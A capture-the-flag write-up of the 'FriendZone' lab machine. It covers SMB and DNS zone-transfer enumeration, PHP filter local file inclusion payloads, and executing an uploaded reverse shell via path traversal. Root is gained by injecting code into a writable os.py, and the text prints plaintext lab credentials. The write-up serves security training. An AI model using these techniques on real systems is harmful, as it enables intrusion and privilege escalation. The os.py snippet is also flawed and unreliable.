# FRIENDZONE

10.10.10.123

# USER

gobuster
```
	/wordpress
	/images
	/upload
	/timestamp
```

SMB enumeration
```
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	Files           Disk      FriendZone Samba Server Files /etc/Files
	general         Disk      FriendZone Samba Server Files
	Development     Disk      FriendZone Samba Server Files
	IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))

Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            FROLIC

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.10.123\Development: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\Development
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\Files: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files /etc/Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\hole
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.123\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (FriendZone server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\general: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\general
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
```

Command below gets to user directory
```
smbclient \\\\10.10.10.123\\general\\
```

Gives us the listing of a file containing
```
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

Querying the DNS server gives us:

```
PORT   STATE SERVICE
53/udp open  domain
| dns-cache-snoop: 1 of 1 tested domains are cached.
|_friendzone.red
```

Using dnsrecon provides us with more information
https://github.com/darkoperator/dnsrecon.git

```
[*] Performing host and subdomain brute force against friendzone.red
[*] 	 A hr.friendzone.red 127.0.0.1
[*] 	 A uploads.friendzone.red 127.0.0.1
```

Using dig to query zone transfers

```
dig axfr friendzone.red @10.10.10.123
```

Outputs:
```
 axfr friendzone.red @10.10.10.123
	;; global options: +cmd
	friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
	friendzone.red.         604800  IN      AAAA    ::1
	friendzone.red.         604800  IN      NS      localhost.
	friendzone.red.         604800  IN      A       127.0.0.1
	administrator1.friendzone.red. 604800 IN A      127.0.0.1
	hr.friendzone.red.      604800  IN      A       127.0.0.1
	uploads.friendzone.red. 604800  IN      A       127.0.0.1
	friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
	;; Query time: 83 msec
	;; SERVER: 10.10.10.123#53(10.10.10.123)
	;; WHEN: Thu Mar 07 16:29:10 UTC 2019
	;; XFR size: 8 records (messages 1, bytes 289)


 axfr friendzoneportal.red @10.10.10.123
	;; global options: +cmd
	friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
	friendzoneportal.red.   604800  IN      AAAA    ::1
	friendzoneportal.red.   604800  IN      NS      localhost.
	friendzoneportal.red.   604800  IN      A       127.0.0.1
	admin.friendzoneportal.red. 604800 IN   A       127.0.0.1
	files.friendzoneportal.red. 604800 IN   A       127.0.0.1
	imports.friendzoneportal.red. 604800 IN A       127.0.0.1
	vpn.friendzoneportal.red. 604800 IN     A       127.0.0.1
	friendzoneportal.red.   604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
	;; Query time: 83 msec
	;; SERVER: 10.10.10.123#53(10.10.10.123)
	;; WHEN: Thu Mar 07 16:37:37 UTC 2019
	;; XFR size: 9 records (messages 1, bytes 309)
```

By adding 10.10.10.123 to hosts file with administrator1.friendzone.red it allows us to virutal host resolve
us to an admin page

```
https://administrator1.friendzone.red
https://uploads.friendzone.red
```

Virutal host routing allows us to use the value below as the host parameter for the https server to give us a secret login box

```
3
```

It logs us into a basic site with some sort of params that run command?


Localfile inclusion allows the reading of php files
```
?image_id=a.jpg&pagename=php://filter/read=convert.base64-encode/resource=timestamp
?image_id=a.jpg&pagename=php://filter/read=convert.base64-encode/resource=https://uploads.friendzone.re
upload.php
```

Way to read php code of websitess
```
pagename=php://filter/read=convert.base64-encode/resource=X
```

Uploading a reverse shell to the SMB share allows us to execute by runing:
```
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../../../../../../../../../../../etc/Development/shell
```

This provides us with a shell and the user.txt.

# ROOT

Creds found in a sql_data.conf

```
friend
Agpyu12!0.213$
```

Found this python file in the /opt/ directory??

```python
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

From further enum it can be seen that we can edit this python library
```
/usr/lib/python2.7/os.py
```

This is imported in the previous script. Therefore, anything places is ```os.py``` will be executed by the script

Exploit added:
```python
# <HACK>
flag = "" 
with open("/root/root.txt", "r") as file:
        data = file.read() 
        
with open("/tmp/" + flag, "w+") as file:
        file.write("hello") 
# </HACK>
```

This copies the root file and gives us it in the temp. This could be expanded for root shell by running a 
reverse shell
